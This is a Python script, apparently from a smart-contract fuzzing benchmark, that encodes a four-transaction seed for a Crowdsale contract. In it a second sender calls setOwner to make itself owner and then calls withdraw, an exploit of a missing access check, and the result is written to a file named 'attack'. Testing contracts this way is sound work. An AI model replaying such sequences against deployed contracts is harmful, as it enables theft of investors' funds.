#!/usr/bin/env python

import json
import subprocess as sp
import sys
import os
import codecs
import random
import struct

# from web3.eth.abi import encodeFunctionSignature


def p64(x):
    return struct.pack("@Q", x)


def p16(x):
    return struct.pack("@H", x)


address_pool = (0x784689c0c5d48cec7275152b3026b53f6f78d03d,
                                    0x87af1d7e20374a20d4d3914c1a1b0ddfef99cc61,
                                    0xfe18c3f08417e77b94fb541fed2bf1e09093edd,
                                    0xddcf2af7ea37d6d9d0a23bdf84c71e8c099d03c2,
                                    0xecb803ea8bc30894cc4672a9159ca000d377d9a3,
                                    0x12e79239d48f83be71dbbd18487f4acc279ee929)

SEED_DIR = "./seeds/"
CALL_VALUE_MAX = 2**64

contract_abi = [
        {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
        {"inputs":[],"name":"echidna_alwaystrue","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[],"name":"invest","outputs":[],"stateMutability":"payable","type":"function"},
        {"inputs":[],"name":"refund","outputs":[],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[{"internalType":"address payable","name":"newOwner","type":"address"}],"name":"setOwner","outputs":[],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[{"internalType":"uint256","name":"newPhase","type":"uint256"}],"name":"setPhase","outputs":[],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}
]

TX_datas = []

txs = [
    (0, ((10000 * 10**18) + (1 << 32)), "invest", None),
    (0, 0, "setPhase", ((1).to_bytes(32, "big").hex(), )),
    (1, 0, "setOwner", (address_pool[1].to_bytes(20, 'big').hex(), )),
    (1, 0, "withdraw", None),
]

for sender_choice, value, name, params in txs:
    params = list(map(str, params if params else []))

    add_params = []
    if params:
        add_params += ["-p"]
        add_params += params
    cmd = ["ethabi", "encode", "function", "../../contracts/Crowdsale.abi", name] + add_params
    print("running command:", *cmd)
    i = sp.check_output(cmd).strip()
    input_encoded = codecs.decode(i, 'hex')

    r = b""
    r += sender_choice.to_bytes(1, 'big')
    r += p64(value >> 32)
    r += p16(len(input_encoded))
    r += input_encoded

    TX_datas.append(r)


with open("./attack", "wb") as fb:
    fb.write(b"".join(TX_datas))
